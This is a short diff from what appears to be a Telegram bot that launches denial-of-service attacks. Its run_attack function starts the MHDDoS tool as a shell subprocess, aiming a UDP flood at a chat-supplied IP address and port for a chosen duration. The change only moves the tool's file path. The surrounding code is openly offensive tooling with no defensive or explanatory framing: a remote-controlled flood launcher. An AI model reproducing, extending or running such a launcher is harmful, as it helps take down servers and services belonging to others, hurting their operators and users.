@@ -63,7 +63,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         attack_process = await asyncio.create_subprocess_shell(
-            f"python3 /workspaces/MHDDOS-TG-BOT/MHDDoS/start.py UDP {ip}:{port} 1 {time}",
+            f"python3 /workspaces/vin/MHDDoS/start.py UDP {ip}:{port} 1 {time}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
